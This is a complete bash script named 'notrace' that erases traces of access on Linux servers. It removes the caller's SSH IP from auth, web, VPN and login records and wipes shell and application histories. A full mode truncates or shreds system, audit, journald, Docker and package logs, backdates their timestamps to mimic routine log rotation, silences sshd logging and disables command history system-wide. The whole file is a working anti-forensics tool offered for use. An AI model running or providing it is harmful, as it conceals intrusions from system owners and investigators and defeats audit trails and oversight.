#!/usr/bin/env bash
set -euo pipefail

VERSION="1.0.0"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

info()  { echo -e "${GREEN}[✓]${NC} $1"; }
warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[✗]${NC} $1"; exit 1; }
header() { echo -e "\n${CYAN}=== $1 ===${NC}"; }

usage() {
    cat <<EOF
notrace v${VERSION} - Server trace cleaner

Usage: sudo bash notrace.sh [OPTION]

Options:
  --self    Clean only YOUR access traces (auto-detect from SSH_CLIENT)
  --all     Complete wipe: all logs, all history, block future logging
  --help    Show this help message

Examples:
  curl -fsSL URL/notrace.sh | sudo bash
  curl -fsSL URL/notrace.sh | sudo bash -s -- --all
EOF
    exit 0
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        error "This script must be run as root (use sudo)"
    fi
}

detect_os() {
    if [[ -f /etc/os-release ]]; then
        . /etc/os-release
        OS=$ID
        OS_LIKE=${ID_LIKE:-}
    else
        OS=$(uname -s)
    fi

    case "$OS" in
        ubuntu|debian|linuxmint|pop|elementary|kali)
            OS_FAMILY="debian" ;;
        centos|rhel|fedora|rocky|almalinux|ol|amzn)
            OS_FAMILY="rhel" ;;
        arch|manjaro|endeavouros|artix)
            OS_FAMILY="arch" ;;
        suse|opensuse*|sles)
            OS_FAMILY="suse" ;;
        alpine)
            OS_FAMILY="alpine" ;;
        *)
            if echo "$OS_LIKE" | grep -qi "debian"; then
                OS_FAMILY="debian"
            elif echo "$OS_LIKE" | grep -qiE "rhel|fedora|centos"; then
                OS_FAMILY="rhel"
            else
                OS_FAMILY="unknown"
            fi ;;
    esac

    info "Detected OS: $OS (family: ${OS_FAMILY:-unknown})"
}

safe_truncate() {
    local file="$1"
    if [[ -f "$file" ]]; then
        : > "$file" 2>/dev/null || true
    fi
}

safe_shred() {
    local file="$1"
    if [[ ! -f "$file" ]]; then
        return
    fi
    if command -v shred &>/dev/null; then
        shred -fzu "$file" 2>/dev/null || rm -f "$file" 2>/dev/null || true
    elif command -v dd &>/dev/null; then
        dd if=/dev/zero of="$file" bs=1M 2>/dev/null || true
        rm -f "$file" 2>/dev/null || true
    else
        : > "$file" 2>/dev/null || true
        rm -f "$file" 2>/dev/null || true
    fi
}

remove_lines_with_ip() {
    local file="$1"
    local ip="$2"
    if [[ ! -f "$file" ]]; then
        return
    fi
    local tmp
    tmp=$(mktemp)
    if grep -vF "$ip" "$file" > "$tmp" 2>/dev/null; then
        if [[ -s "$tmp" ]]; then
            cat "$tmp" > "$file" 2>/dev/null || true
        else
            : > "$file" 2>/dev/null || true
        fi
    fi
    rm -f "$tmp" 2>/dev/null || true
}

# ──────────────────────────────────────────────
#  --self  Only clean YOUR traces
# ──────────────────────────────────────────────
self_clean() {
    header "Mode: Self-clean (your traces only)"

    if [[ -z "${SSH_CLIENT:-}" ]]; then
        warn "SSH_CLIENT not set — are you logged in via SSH?"
        warn "Skipping IP-specific log cleanup."
        MY_IP=""
    else
        MY_IP=$(echo "$SSH_CLIENT" | awk '{print $1}')
        info "Detected your IP: $MY_IP"
    fi

    if [[ -n "$MY_IP" ]]; then
        # ── Auth logs ──
        if [[ "$OS_FAMILY" == "debian" ]]; then
            for f in /var/log/auth.log /var/log/auth.log.* /var/log/auth.log-*; do
                remove_lines_with_ip "$f" "$MY_IP"
            done
            info "Cleaned auth.log"
        else
            for f in /var/log/secure /var/log/secure-*; do
                remove_lines_with_ip "$f" "$MY_IP"
            done
            info "Cleaned /var/log/secure"
        fi

        # ── HTTP logs ──
        for logdir in /var/log/nginx /var/log/httpd /var/log/apache2 /var/log/apache; do
            if [[ -d "$logdir" ]]; then
                for f in "$logdir"/*; do
                    [[ -f "$f" ]] && remove_lines_with_ip "$f" "$MY_IP"
                done
                info "Cleaned $logdir"
            fi
        done

        # ── VPN logs ──
        for logdir in /var/log/openvpn /var/log/wireguard; do
            if [[ -d "$logdir" ]]; then
                for f in "$logdir"/*; do
                    [[ -f "$f" ]] && remove_lines_with_ip "$f" "$MY_IP"
                done
                info "Cleaned $logdir"
            fi
        done

        # ── System text logs ──
        for f in /var/log/messages /var/log/syslog /var/log/kern.log /var/log/debug \
                 /var/log/daemon.log /var/log/user.log /var/log/mail.log \
                 /var/log/mail.err /var/log/mail.warn /var/log/cron.log \
                 /var/log/boot.log /var/log/cloud-init.log /var/log/cloud-init-output.log; do
            remove_lines_with_ip "$f" "$MY_IP"
        done
        info "Cleaned system logs"

        # ── Binary login records (wtmp / btmp / lastlog) ──
        if command -v utmpdump &>/dev/null; then
            for wfile in /var/log/wtmp /var/log/btmp /var/log/lastlog; do
                if [[ -f "$wfile" ]]; then
                    local tmp
                    tmp=$(mktemp)
                    utmpdump "$wfile" 2>/dev/null | grep -vF "$MY_IP" > "$tmp" 2>/dev/null || true
                    if [[ -s "$tmp" ]]; then
                        if utmpdump -r < "$tmp" > "$wfile" 2>/dev/null; then
                            :
                        else
                            : > "$wfile" 2>/dev/null || true
                        fi
                    else
                        : > "$wfile" 2>/dev/null || true
                    fi
                    rm -f "$tmp" 2>/dev/null || true
                fi
            done
            info "Filtered binary login records (wtmp/btmp/lastlog)"
        else
            for wfile in /var/log/wtmp /var/log/btmp; do
                [[ -f "$wfile" ]] && : > "$wfile" 2>/dev/null || true
            done
            warn "utmpdump not found — wtmp/btmp truncated (all records lost)"
        fi

        # ── clear faillog ──
        command -v faillog &>/dev/null && faillog -r 2>/dev/null || true
    fi

    # ── Bash history ──
    history -c 2>/dev/null || true
    : > ~/.bash_history 2>/dev/null || true
    if [[ -f /root/.bash_history ]]; then
        : > /root/.bash_history
    fi

    # Clean history in other users' homes that might contain our IP
    if [[ -n "$MY_IP" ]]; then
        for home in /home/*; do
            [[ -f "$home/.bash_history" ]] && remove_lines_with_ip "$home/.bash_history" "$MY_IP" || true
        done
    fi

    export HISTFILE=/dev/null

    # ── Application histories ──
    for home in /root /home/*; do
        [[ -d "$home" ]] || continue
        for hf in .mysql_history .psql_history .python_history .node_repl_history \
                  .rediscli_history .viminfo .lesshst .nano_history; do
            [[ -f "$home/$hf" ]] && : > "$home/$hf" 2>/dev/null || true
        done
    done
    info "Application histories cleared"

    info "Self-clean complete! Your traces have been removed."
}

# ──────────────────────────────────────────────
#  --all  Total system wipe
# ──────────────────────────────────────────────
total_wipe() {
    header "Mode: Total wipe (complete system cleanse)"

    # [1] System logs
    header "[1/5] Clearing system logs"

    local syslogs=(
        /var/log/messages /var/log/messages-*
        /var/log/syslog /var/log/syslog-*
        /var/log/kern.log /var/log/kern.log.*
        /var/log/debug /var/log/debug-*
        /var/log/daemon.log /var/log/daemon.log.*
        /var/log/user.log /var/log/user.log.*
        /var/log/mail.log /var/log/mail.log.*
        /var/log/mail.err /var/log/mail.warn
        /var/log/cron.log /var/log/cron-*
        /var/log/boot.log /var/log/boot.log.*
        /var/log/dmesg /var/log/dmesg.*
        /var/log/faillog
        /var/log/lastlog
        /var/log/wtmp /var/log/wtmp-*
        /var/log/btmp /var/log/btmp-*
    )
    for log in "${syslogs[@]}"; do
        safe_truncate "$log"
    done

    if [[ "$OS_FAMILY" == "debian" ]]; then
        for f in /var/log/auth.log /var/log/auth.log.*; do safe_truncate "$f"; done
    else
        for f in /var/log/secure /var/log/secure-*; do safe_truncate "$f"; done
    fi
    info "System logs truncated"

    for logdir in /var/log/nginx /var/log/httpd /var/log/apache2 /var/log/apache \
                  /var/log/openvpn /var/log/wireguard; do
        if [[ -d "$logdir" ]]; then
            for f in "$logdir"/*; do [[ -f "$f" ]] && safe_truncate "$f"; done
            info "Cleaned $logdir"
        fi
    done

    if command -v docker &>/dev/null; then
        docker ps -q 2>/dev/null | while read -r cid; do
            local logpath
            logpath=$(docker inspect --format='{{.LogPath}}' "$cid" 2>/dev/null) || continue
            truncate -s 0 "$logpath" 2>/dev/null || true
        done
        info "Docker logs cleared"
    fi

    if command -v journalctl &>/dev/null; then
        journalctl --rotate 2>/dev/null || true
        journalctl --vacuum-size=0 --vacuum-time=1s 2>/dev/null || true
        info "Journald logs cleared"
    fi

    for f in /var/log/audit/audit.log /var/log/audit/audit.log.*; do
        safe_truncate "$f"
    done
    info "Audit logs cleared"

    safe_truncate /var/log/cloud-init.log
    safe_truncate /var/log/cloud-init-output.log

    # [2] Package manager logs
    header "[2/5] Clearing installation records"

    local pkg_logs=()
    case "$OS_FAMILY" in
        debian)
            pkg_logs=( /var/log/dpkg.log /var/log/dpkg.log.* /var/log/apt/history.log /var/log/apt/history.log.* /var/log/apt/term.log /var/log/apt/term.log.* /var/log/bootstrap.log )
            rm -rf /var/log/installer 2>/dev/null || true
            ;;
        rhel)
            pkg_logs=( /var/log/yum.log /var/log/yum.log.* /var/log/dnf.log /var/log/dnf.log.* /var/log/dnf.rpm.log /var/log/dnf.rpm.log.* /var/log/dnf.transaction.log /var/log/dnf.transaction.log.* )
            ;;
        arch)
            pkg_logs=( /var/log/pacman.log /var/log/pacman.log.* )
            ;;
        suse)
            pkg_logs=( /var/log/zypper.log /var/log/zypper.log.* /var/log/zypp/history /var/log/zypp/history.* )
            ;;
    esac

    for log in "${pkg_logs[@]}"; do
        safe_shred "$log"
    done
    info "Package manager logs removed"

    for home in /root /home/*; do
        [[ -d "$home" ]] || continue
        [[ -f "$home/.pip/pip.log" ]] && safe_shred "$home/.pip/pip.log"
        [[ -d "$home/.npm/_logs" ]] && rm -rf "$home/.npm/_logs" 2>/dev/null || true
        [[ -d "$home/.npm/_cacache" ]] && rm -rf "$home/.npm/_cacache" 2>/dev/null || true
        [[ -f "$home/.wget-hsts" ]] && safe_shred "$home/.wget-hsts"
    done
    info "User package caches cleared"

    # [3] History
    header "[3/5] Clearing command and application history"

    for home in /root /home/*; do
        [[ -f "$home/.bash_history" ]] && : > "$home/.bash_history" 2>/dev/null || true
    done
    history -c 2>/dev/null || true
    : > ~/.bash_history 2>/dev/null || true
    export HISTFILE=/dev/null
    info "Bash history cleared for all users"

    local history_files=(
        .mysql_history .psql_history .pg_history
        .python_history .python_repl_history
        .node_repl_history
        .rediscli_history
        .mongosh_history
        .sqlite_history
        .viminfo .vim/.viminfo
        .lesshst .nano_history
        .zsh_history .zsh_sessions
        .irb_history .pry_history
        .Rhistory .Rapp.history
    )

    for home in /root /home/*; do
        [[ -d "$home" ]] || continue
        for hf in "${history_files[@]}"; do
            [[ -f "$home/$hf" ]] && : > "$home/$hf" 2>/dev/null || true
        done
        [[ -f "$home/.ssh/known_hosts" ]] && : > "$home/.ssh/known_hosts" 2>/dev/null || true
    done
    info "Application histories and SSH known_hosts cleared"

    # [4] Timestamp spoofing
    header "[4/5] Spoofing timestamps"

    local past_date="3 days ago"
    for logdir in /var/log /var/log/nginx /var/log/httpd /var/log/apache2 \
                  /var/log/apache /var/log/openvpn /var/log/wireguard \
                  /var/log/audit /var/log/apt /var/log/zypp; do
        if [[ -d "$logdir" ]]; then
            find "$logdir" -type f -exec touch -d "$past_date" {} \; 2>/dev/null || true
        fi
    done
    info "Timestamps spoofed (appear as normal log rotation)"

    # [5] Block future logging
    header "[5/5] Blocking future logging"

    local sshd_config="/etc/ssh/sshd_config"
    if [[ -f "$sshd_config" ]]; then
        if grep -q "^LogLevel" "$sshd_config" 2>/dev/null; then
            sed -i 's/^LogLevel.*/LogLevel QUIET/' "$sshd_config" 2>/dev/null || true
        else
            echo "LogLevel QUIET" >> "$sshd_config" 2>/dev/null || true
        fi
        info "SSH LogLevel set to QUIET (requires sshd restart)"
    fi

    local rsyslog_file="/etc/rsyslog.d/00-notrace.conf"
    if command -v rsyslogd &>/dev/null && [[ -d /etc/rsyslog.d ]]; then
        cat > "$rsyslog_file" 2>/dev/null || true
        systemctl restart rsyslog 2>/dev/null || service rsyslog restart 2>/dev/null || true
        info "Rsyslog configured to suppress auth logging"
    fi

    for rcfile in /etc/profile /etc/bashrc /etc/bash.bashrc /root/.bashrc; do
        if [[ -f "$rcfile" ]] && ! grep -q "HISTSIZE=0" "$rcfile" 2>/dev/null; then
            {
                echo ""
                echo "# notrace: disable command history"
                echo "export HISTSIZE=0"
                echo "export HISTFILESIZE=0"
            } >> "$rcfile" 2>/dev/null || true
        fi
    done
    info "Command history disabled system-wide"

    info "Total wipe complete!"
    warn "SSH changes require: systemctl restart sshd (safe to run later)"
}

# ══════════════════════════════════════════════
#  Main
# ══════════════════════════════════════════════
main() {
    echo -e "${CYAN}╔══════════════════════╗${NC}"
    echo -e "${CYAN}║   notrace v${VERSION}   ║${NC}"
    echo -e "${CYAN}╚══════════════════════╝${NC}"

    check_root
    detect_os

    case "${1:-}" in
        --all|-a)
            total_wipe
            ;;
        --self|-s|"")
            self_clean
            ;;
        --help|-h)
            usage
            ;;
        *)
            error "Unknown option: $1. Use --help for usage."
            ;;
    esac
}

main "$@"
